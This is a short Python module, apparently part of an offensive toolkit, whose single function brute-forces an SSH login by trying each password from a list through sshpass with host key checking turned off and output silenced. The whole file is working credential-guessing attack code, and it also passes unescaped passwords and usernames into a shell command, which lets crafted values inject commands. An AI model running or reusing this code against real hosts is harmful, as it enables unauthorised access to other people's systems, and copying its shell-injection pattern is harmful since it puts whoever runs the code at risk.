from .address import Address
import os

def find_ssh_password(addr: Address, uname: str, pass_list: list):
    """Find correct SSH password from given list."""
    for passwd in pass_list:
        if os.system(f'sshpass -p "{passwd}" ssh -o StrictHostKeyChecking=no -t -l "{uname}" {str(addr)} ":" > /dev/null 2>&1') == 0:
            return passwd
    return None
